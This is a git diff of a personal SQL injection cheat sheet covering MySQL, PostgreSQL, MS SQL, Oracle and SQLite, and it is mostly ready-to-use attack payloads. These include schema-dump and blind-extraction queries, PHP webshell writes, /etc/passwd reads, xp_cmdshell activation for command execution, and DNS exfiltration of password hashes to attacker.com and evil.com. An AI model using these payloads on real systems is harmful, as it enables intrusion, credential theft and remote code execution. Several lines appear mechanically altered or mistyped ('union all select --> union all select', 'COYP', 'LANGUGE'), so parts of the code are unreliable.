@@ -11,7 +11,7 @@ permalink: /infosec/sql-injection.html
 
 <article class="markdown-body" markdown="1">
 
-***THIS ARTICLE MAY CONTAIN syntax inaccuracy, THIS ARTICLE ALSO MUST BE RECONSIDERED AND REORGANIZED***
+***THIS ARTICLE MAY CONTAIN syntax inaccuracy, THIS ARTICLE MUST BE RECONSIDERED AND REORGANIZED***
 
 I collect different types of sqli attacks from the internet.
 
@@ -25,7 +25,7 @@ In this document I am targeting 4 databases: MySQL, PostgreSQL, MS SQL, ORACLE
 
 ---
 
-Additional SQL-injection technics to be studyed:
+Additional SQL-injection technics to be investigated:
 
 * ***DIOS*** - Dump In One Shot
 
@@ -49,9 +49,9 @@ Additional SQL-injection technics to be studyed:
 
     `concat_ws(0x20,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and@:=concat_ws(0x20,@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@)`
 
-    `product_id=50 union select null,null,concat(0x3c2f613e3c2f6c693e3c2f756c3e3c2f6469763e3c6469763e3c666f6e7420636f6c6f723d27677265656e272073697a653d353e5370656369616c20466f7220436f64654279204279204461726b4e6f6465204861636b6572,concat_ws(0x20,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and@:=concat_ws(0x20,@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@),0x3c212d2d) -- -`
+    `product_id=50 union all select null,null,concat(0x3c2f613e3c2f6c693e3c2f756c3e3c2f6469763e3c6469763e3c666f6e7420636f6c6f723d27677265656e272073697a653d353e5370656369616c20466f7220436f64654279204279204461726b4e6f6465204861636b6572,concat_ws(0x20,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and@:=concat_ws(0x20,@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@),0x3c212d2d) -- -`
 
-    `product_id=50 union select null,null,concat('</a></li></ul></div><div><font color='green' size=5>HTML TAGS CLOSE HEADER',concat_ws(' ",@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!='information_schema')and@:=concat_ws(' ',@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@)`
+    `product_id=50 union all select null,null,concat('</a></li></ul></div><div><font color='green' size=5>HTML TAGS CLOSE HEADER',concat_ws(' ",@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!='information_schema')and@:=concat_ws(' ',@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@)`
     
     </div>
     </div>
@@ -61,6 +61,7 @@ Additional SQL-injection technics to be studyed:
 
 * [SQL cheat sheet](http://www.sql-tutorial.net/SQL-Cheat-Sheet.pdf)
 * [SQL tutorial](http://www.sql-tutorial.net/)
+* [SQL injection cheat sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
 
 <br>
 
@@ -70,9 +71,17 @@ Do not really rely on automatic tools.
 * [attackercan/cpp-sql-fuzzer](https://github.com/attackercan/CPP-SQL-FUZZER) - tables of allowed symbols in different inputs of SQL expressions
 * [sqlmap](http://sqlmap.org/) - tool that automates the process of detecting and exploiting SQL injection ([Automated Audit using sqlmap](https://www.owasp.org/index.php/Automated_Audit_using_SQLMap))
 
-    `sqlmap.py -r burp-request.txt -p InjectedParameter` - example 2
+    * `sqlmap.py -r burp-request.txt -p InjectedParameter`
+    * `sqlmap "--suffix= --.example.com" -u "https://10.0.0.1/upload/files/asdf" "--host=settings_conf " -p host --dbms PostgreSQL --os Linux --level 5 --risk 3 --banner` - how to penetrate `Host:` header
 
-    `sqlmap "--suffix= --.example.com" -u "https://10.0.0.1/upload/files/asdf" "--host=settings_conf " -p host --dbms PostgreSQL --os Linux --level 5 --risk 3 --banner` - example1
+    <br>
+
+    * `--check-waf/--identify`
+    * `--fingerprint` - gives moer information then `--banner`
+    * `--batch` - never ask for user input, use default behaviour
+    * `--os-shell`, ...
+
+* [msdat](https://github.com/quentinhardy/msdat) - Microsoft SQL database attacking tool (find valid creds, escalate privileges, execute commands on the operating system)
 
 * [mieliekoek.pl](https://packetstormsecurity.com/files/25807/mieliekoek.pl.html) - SQL insertion crawler which tests all forms on a web site for possible SQL insertion problems
 
@@ -121,6 +130,17 @@ Typical sql-injection workflow:
 - found table names
 - found amount of columns, names and types of columns
 - found contence of tables
+
+<br>
+
+Typical points of injection:
+
+* select `x` from `x` where `x` [order\|group] by `x` limit `x`
+* insert into `x` (a, `x`, c) values (1, `x`, 3), (1, 2, 3)
+* update `x` set `x`=`x` where `x`
+* delete from `x` where `x`=`x` [order\|group] by `x` limit `x`
+
+<br>
 
 SQL injection mitigation:
 
@@ -176,7 +196,8 @@ Any differences in databases syntax or semantics help defining database type.
 Comments
 </td>
 <td markdown="1">
-`#...` `-- ...` `/*...*/` `;\x00...` `/*!50713 or 1=1*/` - comment if mysql version < 5.7.13
+`#...` `-- ...` `/*...*/` `;\x00...`
+<br> `/*!50713 or 1=1*/` - comment if mysql version < 5.7.13
 </td>
 <td markdown="1">
 </td>
@@ -204,16 +225,23 @@ Comments
 <tr> <!-- ======================================================================================================================================== -->
 <td markdown="1">`information_schema` etc.
 </td>
-<td markdown="1">mysql version >= 5
+<td markdown="1"> `information_schema` (MySQL version >= 5)
+</td>
+<td markdown="1"> `information_schema`
 </td>
 <td markdown="1">
-</td>
-<td markdown="1"> \>= 2000
+error messages: `master..sysmessages`
+<br> related services: `master..sysservers`
+<br> passwords: `masters..sysxlogins` (SQL Server 2000)
+<br> passwords: `sys.sql_logins` (SQL Server 2005)
+<br> `select name from sysobjects;`
+<br> `select name from syscolumns;`
 </td>
 <td markdown="1">
 no `information_schema`
-
-special table: `dual`
+<br> special table: `dual`
+<br> `select * from all_tables where OWNER='DATABASE_NAME';`
+<br> `select * from all_col_comments where ...`
 </td>
 </tr> <!-- ======================================================================================================================================== -->
 
@@ -231,20 +259,56 @@ special table: `dual`
 </tr> <!-- ======================================================================================================================================== -->
 
 <tr> <!-- ======================================================================================================================================== -->
-<td markdown="1">
-Query example
+<td markdown="1"> Stacked queries
 </td>
-<td markdown="1">
-`SELECT * FROM information_schema.schemata where 1=1;`
+<td markdown="1"> NO (php)
 </td>
-<td markdown="1">
+<td markdown="1"> YES (php)
+</td>
+<td markdown="1"> YES (php, asp, asp.net)
+</td>
+<td markdown="1"> NO (java)
+</td>
+</tr> <!-- ======================================================================================================================================== -->
 
+<tr> <!-- ======================================================================================================================================== -->
+<td markdown="1"> Query example
+</td>
+<td markdown="1"> `SELECT * FROM information_schema.schemata where 1=1;`
 </td>
 <td markdown="1">
+</td>
+<td markdown="1">
+</td>
+<td markdown="1"> `SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM DUAL;`
+</td>
+</tr> <!-- ======================================================================================================================================== -->
 
+
+<tr> <!-- ======================================================================================================================================== -->
+<td markdown="1">
+Concatenation / CHR
 </td>
 <td markdown="1">
-`SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM DUAL;`
+`'aaa''bbb'` -> `'aaa\'bbb'`; `'aaa' 'bbb'` -> `'aaabbb'`;
+<br> `concat('aaa', 'bbb')` -> `'aaabbb'`; `'aaa'||'bbb'` -> `'aaabbb'` (if ANSI mode)
+<br> `select 0x70686F6E65786963756D;`; `select char(97);`
+<br> `select ascii('a');`
+</td>
+<td markdown="1">
+`'aaa'||'bbb'` -> `'aaabbb'`
+<br> `select chr(97);`
+<br> `select ascii('a');`
+</td>
+<td markdown="1">
+`'aaa' + 'bbb'` -> `'aaabbb'`
+<br> `select 0x70686F6E65786963756D;`; `select char(97);`
+<br> `select ascii('a');`
+</td>
+<td markdown="1">
+`'aaa'||'bbb'` -> `'aaabbb'`
+<br> `select chr(97);`
+<br> `select ascii('a');`
 </td>
 </tr> <!-- ======================================================================================================================================== -->
 
@@ -254,10 +318,10 @@ Query example
 Error example
 </td>
 <td markdown="1">
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near …
+You have an error in your SQL syntax; check the manual <br> that corresponds to your MySQL server version for the right syntax to use near …
 </td>
 <td markdown="1">
-Query failed: ERROR: syntax error at or near “'” at character 56 in /www/site/ test.php on line 121.
+Query failed: ERROR: syntax error at or near “'” at <br> character 56 in /www/site/ test.php on line 121.
 </td>
 <td markdown="1">
 Microsoft SQL Native Client error ‘80040e14’
@@ -274,29 +338,33 @@ ORA-00933: SQL command not properly ended
 Handy functions
 </td>
 <td markdown="1">
-`SUBSTRING (str, pos[, len])`
-`CONCAT (param1, param2, ...)`
-`IF (exp,true,false)`
-
-[String functions](http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#operator_sounds-like)
-
-[Miscellaneous functions](http://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html)
+<br> `SUBSTRING (str, pos[, len])`
+<br> `CONCAT (param1, param2, ...)`
+<br> `IF (exp,true,false)`
+<br> [String functions](http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#operator_sounds-like)
+<br> [Miscellaneous functions](http://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html)
 </td>
 <td markdown="1">
-    
+`select case when 1=1 then true else falsefalse end;`
 </td>
 <td markdown="1">
-`if 1=1 select... else select ...;` - *`if` cann't be used inside `select`*
-
-`case ... [when ... then ...]* else ... end`
+`if 1=1 select ... else select ...;` - *`if` cann't be used inside `select`*
+<br> `case ... [when ... then ...]* else ... end`
+<br> `if ((select user) = 'sa' or (select user) = 'dbo') select 1 else select 1/0`
+<br> *fun:* `... ; shutdown ; ...`
 </td>
 <td markdown="1">
-
+`if 1=1 then dbms_lock.sleep(0); else dbms_lock.sleep(3); end if; end;`
 </td>
 </tr> <!-- ======================================================================================================================================== -->
 
 </tbody>
 </table>
+
+SQLite `information_schema` analogue: `sqlite_master`:
+
+* `SELECT name FROM my_db.sqlite_master WHERE type='table';` - get table names
+* `SELECT sql FROM sqlite_master WHERE tbl_name = 'MyTable' AND type = 'table';` - get create query for MyTable
 
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
@@ -310,11 +378,11 @@ Handy functions
 - `+`, `-`, `=`, `&`, `|`, `&&`, `||`, `<=>`, `<=`, `>=`, `!=`, `<>`, `^`, `*`, `<<`, `>>`, `<>`, `%`, `/`, `<`, `>`, `~`
 
 
-### Databases features
+### Database features
 
 #### MySQL
 
-1. `group by x` in MySQL will group results by x, even if final table will have other column y and some rows with identical x will have different y. MySQL will just select some random row for the final table. To the contrary, any other databases will not do so, they will throw error in such uncertain cituation.<br>&#20;
+1. `group by x` in MySQL will group results by x, even if final table will have other column y and some rows with identical x will have different y. MySQL will just select some random row for the final table. To the contrary, any other databases will not do so, they will throw error in such uncertain cituation.
 
 
 1. MySQL @@version < 3
@@ -348,11 +416,7 @@ Handy functions
 
     ```select * from `information_schema`.`shemata`;```
 
-<!--
-
 #### PostgreSQL
-
--->
 
 #### MS SQL
 
@@ -364,7 +428,7 @@ Handy functions
     
     `S%E%L%E%C%T%01column%02FROM%03table;`
 
-2. Stacked queries support
+1. Stacked queries support
 
     `...' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');`
 
@@ -375,6 +439,13 @@ Handy functions
     `?id=1; select * from OPENRAWSET('SQLOLEDB', '';'user_id';'passwd','waitfor delay "0:0:50"; select 1;');` - just a delay <br>
     `?id=1; select*from OPENRAWSET('SQLOLEDB','';'user_id';'passwd','exec master..sp_addsrvrolemember "passwd","sysadmin"; select 1');` - add current user to admin group
 
+1. some syntax:
+
+    <br> `where users not in ('aaa', 'bbb')`
+    <br> `select top 1 name from members where not exist(select top 0 name from members)`
+
+1. some functions: VERSION(), MD5(), SHA1(), PASSWORD(), ENCODE(), COMPRESS(), ROW_COUNT(), SCHEMA()
+
 #### ORACLE
 
 1. Table and database names can be encoded
@@ -382,6 +453,24 @@ Handy functions
 3. No `limit`, no `offset`, use
 
     `select id from (select id, rownum rnum from users a) where rnum=13;`
+
+<!-- ============================================================================================================================================ -->
+<!-- ============================================================================================================================================ -->
+<!-- ============================================================================================================================================ -->
+
+<br><br>
+
+---
+
+## Database elemental management
+
+``` sql
+CREATE DATABASE sqlilabs;
+CREATE USER 'sqlilabs'@'localhost' IDENTIFIED BY 'jafopw38JOEJ';
+GRANT ALL PRIVILEGES ON sqlilabs . * TO 'sqlilabs'@'localhost';
+
+SET PASSWORD FOR 'username'@'localhost' = 'password';
+```
 
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
@@ -406,7 +495,7 @@ Use `NULL` - because usually you have no idea about types
 
 - Typical attack vector:
 
-    - `?id=1' limit 0 union select group_concat(schema_name) from information_schema.schemata -- -`
+    - `?id=1' limit 0 union all select group_concat(schema_name) from information_schema.schemata -- -`
 
 
 - Concatenation column values into one cell
@@ -483,7 +572,7 @@ select concat( concat(
         `AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)`
 
 
-- <div><pre>UNION SELECT name FROM master..sysobjects WHERE xtype='U';
+- <div><pre>union all SELECT name FROM master..sysobjects WHERE xtype='U';
 'V' - for views 'U' - for user defined </pre></div>
 
 #### ORACLE
@@ -522,11 +611,15 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
     - `select * from users where (SELECT * from users)=(1,2);`
     
         Error: `Operand should `**`contain 5 column(s)`**
+    
+    - `select * from users union all select 1,2,3,NULL,NULL,NULL,NULL,NULL,NULL` (types of columns must match or be of derived types or `NULL`)
+
+        Error: `The used SELECT statements have a different number of columns`
 
 
 - Reading column names
 
-    - `select * from users where (1,2,3) = (select * from users UNION select 1%0,2,3);`
+    - `select * from users where (1,2,3) = (select * from users union all select 1%0,2,3);`
 
         Error: `Column 'id' `**`cannot be null`**
 
@@ -556,10 +649,6 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
         `select COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2) )x from users GROUP BY x;`
 
         *Does not work with `group_concat` instead of `version`*
-
-    - Convertion errors:
-
-        ``
 
     - `BIGINT UNSIGNED` error. *error length <= 452*
 
@@ -604,6 +693,15 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
 
 #### PostgreSQL
 
+- stacked queries:
+
+    `select 1,2 ; select 1,2,3;`
+
+- Counting amount of columns
+
+    - `select * from users order by 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15;`
+    - `select * from users union all select 1,2,3,NULL,NULL,NULL,NULL,NULL,NULL` (types of columns must match or be of derived types or `NULL`)
+
 - incorrect data type casting
 
     `select cast(version() as numeric);`
@@ -611,12 +709,17 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
 
 #### MS SQL
 
+- Counting amount of columns
+
+    - `select * from users group by 5;`
+
 - Reading column names
 
     - `group by x` will fail if table has column y and pair (x1, y1) != (x2, y2)
 
         Error: **`Column`**` 'Users.password' `**`is invalid`**` ... it is not contained in either an aggregate function or the GROUP BY clause.`
 
+    - `... group by table.column1 having 1=1`
 
 - Reading values
 
@@ -634,6 +737,10 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
     `SELECT * FROM dbo.news WHERE id=1 and USER_NAME((select login + char(58) + pass as l from users for xml raw)) is not null;`
 
 #### ORACLE
+
+- Counting amount of columns
+
+    - `select * from users group by 5;`
 
 - Reading values
 
@@ -689,7 +796,7 @@ from dual);</pre>
 
 - **`ORDER BY`** injection
 
-    `select * from news ORDER BY ( id * if (ascii (substring (version(),0,1) ) = 53, 1, -1));`
+    `select * from news ORDER BY ( id * if (ascii (substring (version(),1,1) ) = 53, 1, -1));`
 
 
 - **`FIND_IN_SET`** to get more info from each query
@@ -715,7 +822,7 @@ from dual);</pre>
     (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1'),
     (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f'),
     ('}'),
-    (select 1 union select 2))),
+    (select 1 union all select 2))),
     '}x{1,0}')),
     '}x{1,(')),
     '}[[:]]')),
@@ -733,7 +840,7 @@ from dual);</pre>
 > > <br>
 > >
 | 0  | `select 1;`                                   | No error                                                            |
-| 1  | `select if(1=1,(select 1 union select 2),2);` | #1242 - Subquery returns more than 1 row                            |
+| 1  | `select if(1=1,(select 1 union all select 2),2);` | #1242 - Subquery returns more than 1 row                            |
 | 2  | `select 1 regexp if(1=1,"x{1,0}",2);`         | #1139 - Got error 'invalid repetition count(s)' from regexp         |
 | 3  | `select 1 regexp if(1=1,"x{1,(",2);`          | #1139 - Got error 'braces not balanced' from regexp                 |
 | 4  | `select 1 regexp if(1=1,'[[:]]',2);`          | #1139 - Got error 'invalid character class' from regexp             |
@@ -755,9 +862,9 @@ from dual);</pre>
 
 ---
 
-### Time-delay (double-blind) SQL injection 
+### Time-based (double-blind) SQL injection 
 
-sleep or analogue, or heavy queries or analogue
+sleep or analogue, or heavy queries
 
 #### MySQL
 
@@ -810,6 +917,7 @@ sleep or analogue, or heavy queries or analogue
 
         `select * from table INTO OUTFILE '/path/to/shell.php' FIELDS TERMINATED BY '' optionally enclosed by "<?php system($_GET[k]);die();?>"`
 
+        `select 1,'<?php system($_GET[cmd]); ?>' from table INTO OUTFILE '/path/to/webshell.php'`
     
     - **`LOAD DATA INFILE`**
 
@@ -821,9 +929,9 @@ sleep or analogue, or heavy queries or analogue
 
 - **internet connections**. *Config must have `FILE_PRIV=yes`*
 
-    - **DNS request**
+    - **DNS exfiltration**
 
-        `LOAD_FILE (concat ('http://begin.', (select mid (version(), 1, 1)), '.attacker.com/'));`
+        `SELECT LOAD_FILE (concat ('http://begin.', (select mid (version(), 1, 1)), '.attacker.com/'));`
 
     - **SMB protocol, etc.**
 
@@ -837,58 +945,113 @@ sleep or analogue, or heavy queries or analogue
 
 #### PostgreSQL
 
-- Handy functions
+- **file read/write**
 
-    - **XXE** - `xmlparse`
+    - **`COPY FROM`**
 
-        <pre>select xmlparse(document '
-    &lt;?xml version="1.0" standalone="yes"?&gt;
-        <!DOCTYPE content [
-            <!ENTITY abc SYSTEM "/etc/network/if-up.d/mountnfs">
-        ]>
-&lt;content>&abc;&lt;/content>');</pre>
+        `CREATE TABLE xxx(data text); COPY xxx FROM '/etc/passwd';`
+
+    - **`COPY TO`**
+
+        `CREATE TABLE xxx(data text); INSERT INTO xxx(data) VALUES ('<?php system($_GET[cmd]); ?>'); COYP xxx(data) TO '/path/to/webshell.php'`
+
+-   **XXE** - `xmlparse`
+
+    ```
+    select xmlparse(document '
+    <?xml version="1.0" standalone="yes"?>;
+    <!DOCTYPE content [
+        <!ENTITY abc SYSTEM "/etc/network/if-up.d/mountnfs">
+    ]>
+    <content>&abc;</content>');
+    ```
+
+- **DNS exfiltration** ([by @Miroslav Stampar](https://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281/))
+
+    ```
+    DROP TABLE IF EXISTS xxx;
+    CREATE TABLE xxx(content text);
+    CREATE OR REPLACE FUNCTION temp_func()
+    RETURNS VOID AS $$
+    DECLARE exec_cmd TEXT;
+    DECLARE query_result TEXT;
+    BEGIN
+        SELECT INTO query_result (SELECT version());
+        exec_cmd := E'COPY xxx(content) FROM E\'\\\\\\\\'||query_result||E'.attacker.com\\\\ddd.txt\'';
+        EXECUTE exec_cmd;
+    END;
+    $$ LANGUGE plpgsql SECURITY DEFINER;
+    SELECT temp_func();
+    ```
 
 #### MS SQL
+
+- **file read/write**
+
+    - read (**file**): `file(%systemroot%\system32\inetsrv\MetaBase.xml)` (IIS 6 - web-app metadata)
+
+    - write (**BCP**): `bcp "SELECT * FROM test..my_table" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Ppassword` (requires password)
 
 - **internet connections**
 
     - **`OPENRAWSET`**
 
-        `select * from OPENROWSET('SQLOLEDB', 'Network=DBMSSOCN; Address=evil.com; uid=my_username; pwd=mypassword', 'select user_password from users);`
+        `select * from OPENROWSET('SQLOLEDB', 'Network=DBMSSOCN; Address=evil.com; uid=my_username; pwd=mypassword', 'select user_password from users');`
+    
+    - `EXEC master..xp_dirtree '\\' + (select 1) + '.evil.com\\test.txt'`
 
+    -   **DNS exfiltration**
+
+        ```
+        DECLARE @host varchar(1024);
+        SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa') + '.attacker.com';
+        EXEC('master..xp_dirtree "\\' + @host + '\c$"');
+        ```
 
 - **RCE** - *`exec` and stored procedure `xp_cmdshell` - must be activated*
 
     - `EXEC master.dbo.XP_CMDSHELL 'pwd';`
 
-    - **xp_cmdshell activation**:
+    -   **xp_cmdshell activation**:
 
-        <pre>EXEC sp_configure 'show advanced options', 1;
-EXEC sp_configure reconfigure;
-EXEC sp_configure 'xp_cmdshell', 1;
-EXEC sp_configure reconfigure;</pre>
+        ```
+        EXEC sp_configure 'show advanced options', 1;
+        EXEC sp_configure reconfigure;
+        EXEC sp_configure 'xp_cmdshell', 1;
+        EXEC sp_configure reconfigure;
+        ```
 
-    - **without xp_cmdshell** - creation of your own stored procedure:
+    -   **without xp_cmdshell** - creation of your own stored procedure:
 
-        <pre>EXEC sp_configure 'show advanced options', 1;
-EXEC sp_configure reconfigure;
-EXEC sp_configure 'OLE Automation Procedures', 1;
-EXEC sp_configure reconfigure;
-\
-DECLARE @execmd INT;
-EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT;
-EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
+        ```
+        EXEC sp_configure 'show advanced options', 1;
+        EXEC sp_configure reconfigure;
+        EXEC sp_configure 'OLE Automation Procedures', 1;
+        EXEC sp_configure reconfigure;
 
+        DECLARE @execmd INT;
+        EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT;
+        EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';
+        ```
+    
+    - ***more stored procedures***: xp_cmdshell (cmd execute) xp_regread (registry stuff):, xp_regaddmultistring, xp_regdeletekey, xp_regdeletevalue, xp_regenumkeys, xp_regenumvalues, xp_regread, xp_regremovemultistring, xp_regwrite, xp_servicecontrol (managing services), xp_availablemedia (medias), xp_enumdsn (ODBC resources), xp_loginconfig (login mode), xp_makecab (creating cab files), xp_ntsec_enumdomains (domain enumeration), xp_terminate_process (process killing), sp_addextendedproc (add new procedure), sp_makewebtask (write text file to a UNC or an internal path)
+
+    - **execute VBS/WSH**
+        
+        `declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' –`
 
 #### ORACLE
 
 - **internet connections**
 
     - **`UTL_HTTP.REQUEST`**
-        `select * from users where id=10 || UTL_HTTP.REQUEST ('evil.com' || (select user from dual)) --`
+        <br> `select * from users where id=10 || UTL_HTTP.REQUEST ('evil.com' || (select user from dual)) --`
 
     - **`UTL_INADDR.GET_HOST_ADDRESS`**
-        `select UTL_INADDR.GET_HOST_ADDRESS('evil.com') from dual;`
+        <br> `select UTL_INADDR.GET_HOST_ADDRESS('evil.com') from dual;`
+
+    - **DNS exfiltration**
+        <br> `SELECT SYS.DBMS_LDAP.INIT((SELECT version())||'.attacker.com', 80) FROM DUAL;`
 
 
 - Handy functions:
@@ -933,13 +1096,13 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 
 - **hex** encoding `'/etc/passwd' -> 0x2F6574632F706173737764`
 
-- `union select` --> `uNioN SeLeCt`
+- `union all select` --> `union all SeLeCt`
 
-- `union select` --> `union all select`
+- `union all select` --> `union all select`
 
 - `and` --> if (a, if (b, true, 0), 0)
 
-- comments `/*! select ... */`<br>&#20;
+- comments `/*! select ... */`
 
 - change syntax and sql query structure. **Synonyms**!
 
@@ -988,6 +1151,11 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 
     `select * from (select 1)x join (select 2)y join (select 3)z;`
 
+#### PostgreSQL:
+
+- change syntax and sql query structure. **Synonyms**!
+
+    `chr(0x41)||chr(0x42)`
 
 #### MS SQL:
 
@@ -1040,7 +1208,7 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 
 ---
 
-# Some big scripts (do not know if they really works)
+# Some big scripts (don't know if they really works)
 
 Create a new stored procedure, called `xp_cmdshell3`:
 
